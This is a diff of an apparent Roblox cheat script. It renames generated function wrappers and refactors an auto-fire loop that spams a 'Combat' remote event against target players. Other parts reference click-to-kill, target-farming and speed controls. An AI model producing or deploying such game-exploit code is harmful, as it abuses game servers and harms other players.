@@ -2164,8 +2259,8 @@ local function DUVI_fake_script() -- bSliderFrame.mainScript
 		end)
 	end
 end
-coroutine.wrap(DUVI_fake_script)()
-local function OUDGLWU_fake_script() -- bSliderFrame_2.mainScript 
+coroutine.wrap(ILJR_fake_script)()
+local function IMXQQJ_fake_script() -- bSliderFrame_2.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame_2)
 
 	local Players = game:GetService("Players")
@@ -2368,8 +2463,8 @@ local function OUDGLWU_fake_script() -- bSliderFrame_2.mainScript
 		end)
 	end
 end
-coroutine.wrap(OUDGLWU_fake_script)()
-local function ECMCCTF_fake_script() -- TargetHit.LocalScript 
+coroutine.wrap(IMXQQJ_fake_script)()
+local function CHUZ_fake_script() -- TargetHit.LocalScript 
 	local script = Instance.new('LocalScript', TargetHit)
 
 	local Players = game:GetService("Players")
@@ -2584,8 +2679,8 @@ local function ECMCCTF_fake_script() -- TargetHit.LocalScript
 		end
 	end)
 end
-coroutine.wrap(ECMCCTF_fake_script)()
-local function QPHPW_fake_script() -- bSliderFrame_3.mainScript 
+coroutine.wrap(CHUZ_fake_script)()
+local function MRMEIDB_fake_script() -- bSliderFrame_3.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame_3)
 
 	local Players = game:GetService("Players")
@@ -2704,9 +2799,6 @@ local function QPHPW_fake_script() -- bSliderFrame_3.mainScript
 	
 	updateSlider(0)
 	
-	-- =========================
-	-- AUTO FIRE LOOP
-	-- =========================
 	task.spawn(function()
 		while true do
 			if autoFire then
@@ -2721,14 +2813,10 @@ local function QPHPW_fake_script() -- bSliderFrame_3.mainScript
 					if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
 						local remote = getRemote()
 						if remote then
-							remote:FireServer(targetRoot, "Combat")
-							remote:FireServer(targetRoot, "Combat")
-							remote:FireServer(targetRoot, "Combat")
-							remote:FireServer(targetRoot, "Combat")
-							remote:FireServer(targetRoot, "Combat")
-							remote:FireServer(targetRoot, "Combat")
-							remote:FireServer(targetRoot, "Combat")
-	
+							-- Fire 7 times using a for loop
+							for i = 1, 7 do
+								remote:FireServer(targetRoot, "Combat")
+							end
 						end
 					end
 				end
@@ -2738,9 +2826,6 @@ local function QPHPW_fake_script() -- bSliderFrame_3.mainScript
 		end
 	end)
 	
-	-- =========================
-	-- TOGGLE BUTTON
-	-- =========================
 	if toggleButton then
 		toggleButton.MouseButton1Click:Connect(function()
 			autoFire = not autoFire
@@ -2748,8 +2833,8 @@ local function QPHPW_fake_script() -- bSliderFrame_3.mainScript
 		end)
 	end
 end
-coroutine.wrap(QPHPW_fake_script)()
-local function SWLXP_fake_script() -- bSliderFrame_4.mainScript 
+coroutine.wrap(MRMEIDB_fake_script)()
+local function ACFUVA_fake_script() -- bSliderFrame_4.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame_4)
 
 	local Players = game:GetService("Players")
@@ -2927,8 +3012,8 @@ local function SWLXP_fake_script() -- bSliderFrame_4.mainScript
 		end)
 	end
 end
-coroutine.wrap(SWLXP_fake_script)()
-local function WCBO_fake_script() -- bSliderFrame_5.mainScript 
+coroutine.wrap(ACFUVA_fake_script)()
+local function QQMBYE_fake_script() -- bSliderFrame_5.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame_5)
 
 	local Players = game:GetService("Players")
@@ -3099,8 +3184,8 @@ local function WCBO_fake_script() -- bSliderFrame_5.mainScript
 		end)
 	end
 end
-coroutine.wrap(WCBO_fake_script)()
-local function QXTRKN_fake_script() -- FarmTarget.LocalScript 
+coroutine.wrap(QQMBYE_fake_script)()
+local function NIBQB_fake_script() -- FarmTarget.LocalScript 
 	local script = Instance.new('LocalScript', FarmTarget)
 
 	local Players = game:GetService("Players")
@@ -3258,8 +3343,8 @@ local function QXTRKN_fake_script() -- FarmTarget.LocalScript
 		end
 	end)
 end
-coroutine.wrap(QXTRKN_fake_script)()
-local function IRJZKQU_fake_script() -- TextButton.LocalScript 
+coroutine.wrap(NIBQB_fake_script)()
+local function SLST_fake_script() -- TextButton.LocalScript 
 	local script = Instance.new('LocalScript', TextButton)
 
 	script.Parent.MouseButton1Click:connect(function()
@@ -3271,8 +3356,8 @@ local function IRJZKQU_fake_script() -- TextButton.LocalScript
 		wait(0.1)
 	end)
 end
-coroutine.wrap(IRJZKQU_fake_script)()
-local function GPZGPUK_fake_script() -- MouseClickTouchPlayertoKill.LocalScript 
+coroutine.wrap(SLST_fake_script)()
+local function RBPCEO_fake_script() -- MouseClickTouchPlayertoKill.LocalScript 
 	local script = Instance.new('LocalScript', MouseClickTouchPlayertoKill)
 
 	local Players = game:GetService("Players")
@@ -3443,8 +3528,8 @@ local function GPZGPUK_fake_script() -- MouseClickTouchPlayertoKill.LocalScript
 		end)
 	end
 end
-coroutine.wrap(GPZGPUK_fake_script)()
-local function CMLPYF_fake_script() -- TextButton_2.LocalScript 
+coroutine.wrap(RBPCEO_fake_script)()
+local function YLGNUT_fake_script() -- TextButton_2.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_2)
 
 	script.Parent.MouseButton1Click:connect(function()
@@ -3456,8 +3541,8 @@ local function CMLPYF_fake_script() -- TextButton_2.LocalScript
 		wait(0.1)
 	end)
 end
-coroutine.wrap(CMLPYF_fake_script)()
-local function CDKNSQ_fake_script() -- TextButton_3.LocalScript 
+coroutine.wrap(YLGNUT_fake_script)()
+local function OLMBWU_fake_script() -- TextButton_3.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_3)
 
 	local Players = game:GetService("Players")
@@ -3496,8 +3581,8 @@ local function CDKNSQ_fake_script() -- TextButton_3.LocalScript
 		end
 	end)
 end
-coroutine.wrap(CDKNSQ_fake_script)()
-local function ARTDR_fake_script() -- TextButton_4.LocalScript 
+coroutine.wrap(OLMBWU_fake_script)()
+local function YRXLCUM_fake_script() -- TextButton_4.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_4)
 
 	local button = script.Parent
@@ -3529,9 +3614,9 @@ local function ARTDR_fake_script() -- TextButton_4.LocalScript
 		end
 	end)
 end
-coroutine.wrap(ARTDR_fake_script)()
-local function WMVL_fake_script() -- TextLabel_16.LocalScript 
-	local script = Instance.new('LocalScript', TextLabel_16)
+coroutine.wrap(YRXLCUM_fake_script)()
+local function CEDBIW_fake_script() -- TextLabel_18.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel_18)
 
 	local Players = game:GetService("Players")
 	local lp = Players.LocalPlayer
@@ -3574,8 +3659,8 @@ local function WMVL_fake_script() -- TextLabel_16.LocalScript
 	
 	
 end
-coroutine.wrap(WMVL_fake_script)()
-local function FQZOUNA_fake_script() -- TextButton_5.LocalScript 
+coroutine.wrap(CEDBIW_fake_script)()
+local function HDQAJIM_fake_script() -- TextButton_5.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_5)
 
 	local Players = game:GetService("Players")
@@ -3605,9 +3690,9 @@ local function FQZOUNA_fake_script() -- TextButton_5.LocalScript
 		button.BackgroundColor3 = looping and Color3.fromRGB(51, 255, 47) or Color3.fromRGB(255, 0, 0)
 	end)
 end
-coroutine.wrap(FQZOUNA_fake_script)()
-local function HRVWAM_fake_script() -- TextLabel_18.LocalScript 
-	local script = Instance.new('LocalScript', TextLabel_18)
+coroutine.wrap(HDQAJIM_fake_script)()
+local function ARMTQNS_fake_script() -- TextLabel_20.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel_20)
 
 	local Players = game:GetService("Players")
 	local RunService = game:GetService("RunService")
@@ -3707,9 +3792,9 @@ local function HRVWAM_fake_script() -- TextLabel_18.LocalScript
 		end)
 	end)
 end
-coroutine.wrap(HRVWAM_fake_script)()
-local function GQEXGN_fake_script() -- TextLabel_19.LocalScript 
-	local script = Instance.new('LocalScript', TextLabel_19)
+coroutine.wrap(ARMTQNS_fake_script)()
+local function DCFOG_fake_script() -- TextLabel_21.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel_21)
 
 	local Players = game:GetService("Players")
 	local localPlayer = Players.LocalPlayer
@@ -3774,9 +3859,9 @@ local function GQEXGN_fake_script() -- TextLabel_19.LocalScript
 		end
 	end)
 end
-coroutine.wrap(GQEXGN_fake_script)()
-local function XFCTZ_fake_script() -- TextLabel_20.LocalScript 
-	local script = Instance.new('LocalScript', TextLabel_20)
+coroutine.wrap(DCFOG_fake_script)()
+local function GGPB_fake_script() -- TextLabel_22.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel_22)
 
 	local RunService = game:GetService("RunService")
 	local Players = game:GetService("Players")
@@ -3820,8 +3905,8 @@ local function XFCTZ_fake_script() -- TextLabel_20.LocalScript
 	
 	
 end
-coroutine.wrap(XFCTZ_fake_script)()
-local function LIMSY_fake_script() -- bSliderFrame_6.mainScript 
+coroutine.wrap(GGPB_fake_script)()
+local function IPLOXGC_fake_script() -- bSliderFrame_6.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame_6)
 
 	local Players = game:GetService("Players")
@@ -3925,9 +4010,9 @@ local function LIMSY_fake_script() -- bSliderFrame_6.mainScript
 	-- Initial display
 	amountValue.Text = tostring(currentSpeed)
 end
-coroutine.wrap(LIMSY_fake_script)()
-local function FWCUQI_fake_script() -- TextLabel_24.LocalScript 
-	local script = Instance.new('LocalScript', TextLabel_24)
+coroutine.wrap(IPLOXGC_fake_script)()
+local function WVBQN_fake_script() -- TextLabel_26.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel_26)
 
 	local RunService = game:GetService("RunService")
 	local Players = game:GetService("Players")
@@ -3980,8 +4065,8 @@ local function FWCUQI_fake_script() -- TextLabel_24.LocalScript
 		end
 	end)
 end
-coroutine.wrap(FWCUQI_fake_script)()
-local function ZIBTAFH_fake_script() -- TextButton_6.LocalScript 
+coroutine.wrap(WVBQN_fake_script)()
+local function NMIUPWG_fake_script() -- TextButton_6.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_6)
 
 	-- Button system
@@ -4042,4 +4127,4 @@ local function ZIBTAFH_fake_script() -- TextButton_6.LocalScript
 		resetPlayer()
 	end)
 end
-coroutine.wrap(ZIBTAFH_fake_script)()
+coroutine.wrap(NMIUPWG_fake_script)()
